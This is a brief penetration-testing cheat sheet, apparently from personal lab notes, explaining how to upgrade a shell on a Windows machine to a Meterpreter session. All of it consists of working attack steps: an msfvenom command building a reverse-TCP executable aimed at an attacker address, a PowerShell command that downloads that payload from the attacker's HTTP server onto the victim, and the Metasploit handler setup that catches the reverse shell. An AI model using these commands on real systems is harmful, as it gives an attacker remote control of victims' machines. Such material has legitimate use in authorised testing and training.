# Upgrading shell to meterpreter
___
Index | Topic
--- | ---
**1** | Description
**2** | Commands

## Description

Once you have a shell in a windows system, we can upgrade it to a meterpreter sessions.

## Commands

- Generate the executable `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.52.13 LPORT=9001 -f exe > shell.exe`
- In the windows machine, change to a writeable folder like `c:\Windows\Temp`
- In the attack machine, start an http server
- In the victim machine, download the file with: `powershell -c "Invoke-WebRequest -Uri 'http://10.10.52.13:8000/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"`
- Start metasploit
- Use `exploit/multi/handler`
- Set the payload `windows/meterpreter/reverse_tcp`
- Set the lhost and lport options
- Run the exploit
- Run the shell.exe on the victim
